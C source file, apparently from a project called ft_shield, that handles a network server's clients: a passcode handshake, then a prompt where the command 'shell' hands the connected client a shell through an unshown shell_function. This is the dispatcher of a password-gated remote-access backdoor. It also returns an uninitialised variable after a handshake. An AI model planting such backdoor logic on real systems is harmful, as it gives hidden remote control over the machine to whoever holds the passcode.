#include "ft_shield.h"

void handle_handshake(t_server *server, int index, char *input)
{
	t_client *client = &server->clients[index];

	if (client->status == HANDSHAKE)
	{
		dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
		if (strcmp(PASSCODE, input) != 0) {
			dprintf(2, "Invalid KEY\n");
			return ;
		}
		dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
	}
	send(client->fd, "$> ", 3, 0);
}

int	handle_commands(t_server *server, int index, char *input)
{
	t_client *client = &server->clients[index];

	if (strcmp("clear", input) == 0)
	{
		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
	}
	else if (strcmp("shell", input) == 0)
	{
		dprintf(2, "client_fd: %d\n", client->fd);
		shell_function(server, index);

	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		send(client->fd, HELP, sizeof(HELP), 0);
	}
	send(client->fd, "$> ", 3, 0);
	return (0);
}

int handle_input(t_server *server, int index, char *buffer)
{
	char	*input = ft_strtrim(buffer, TRIM_CHARS);
	int		fd;

	t_client *client = &server->clients[index];

	dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(server, index, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(server, index, input);
	free(input);
	return (fd);
}
